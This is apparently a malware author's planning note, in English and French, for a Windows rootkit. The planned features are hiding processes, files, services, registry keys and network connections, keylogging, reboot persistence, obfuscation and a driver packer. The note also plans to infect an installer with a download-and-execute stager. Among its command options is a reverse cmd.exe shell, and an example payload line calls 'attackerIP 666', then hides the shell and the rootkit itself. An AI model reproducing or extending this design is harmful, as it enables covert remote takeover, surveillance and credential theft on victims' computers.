Hide Service(himself)
Immortal process					-> http://www.ivanlef0u.tuxfamily.org/?p=136
Hide TCP UDP connections
Hide Registry key
Survive reboot						-> presque bon
Keylogger
Driver Obfucation
Client Obfuscation
Payload system (ini file with sequence of preconfigured commands)
Portability within windows versions	-> All nt systems is preferable
Driver packer/unpacker				-> je vais le stocker au cul du client.exe 
									et il y aura une petite routine asm qui 
									commencera par unpacker le driver et son payload
									(si ca a pas deja ete fait).
									Ainsi le client.exe sera tout en un et pourra
									aisement etre utilise dans une strategie Download and Exec

Todo options:
--tcpshell <IP> <PORT>				-> Open TCP connection, start cmd.exe with i/o redirected on socket fd
--hport <PORT> <PROTOCOLE/all>		-> hide TCP and/or UDP connection
--hs <me/SERVICE>					-> hide service by name
--hk <me/KEY>						-> hide registry key
--hf <me/FILENAME>					-> hide file by name
--hp <me/PID/NAME>					-> hide process by name or pid
--im <me/PID/NAME>					-> set a process immortal by name or pid
--log <err/warn/all> <LOGFILE>		-> log
--loop <0/NBLOOP>					-> loop commands (0 = infiny)
--wait <USEC>						-> wait USEC micro-seconds

Infecter (packer - jambiKeepSize) un installeur avec un download and exec
qui va chercher le pack (client + driver + payload)
une fois l'installeur execute en root, 
le pack est telecharge et execute.
Le driver et le payload s'auto-unpack.
Le client charge et execute le payload.

Payload exemple:
--start --log all soundmgr.log --im me --tcpshell attackerIP 666 --im cmd.exe --hport 666 tcp --hs me --hf me --reboot on --hk me

Un serveur ecoute sur le port voulu et attend pour une 
connection TCP.

Connection sur seveur IRC serai le must :)
